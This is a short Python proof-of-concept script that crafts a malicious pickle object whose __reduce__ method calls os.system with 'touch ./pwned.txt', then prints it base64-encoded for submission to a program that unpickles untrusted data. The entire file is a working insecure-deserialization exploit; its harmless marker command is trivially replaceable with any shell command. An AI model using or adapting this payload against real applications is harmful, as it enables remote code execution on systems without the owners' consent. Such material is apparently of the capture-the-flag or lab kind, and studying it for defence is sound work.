import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return os.system, ("touch ./pwned.txt",)

object = RCE()
pickled = pickle.dumps(object)
encoded = base64.b64encode(pickled)

print(encoded)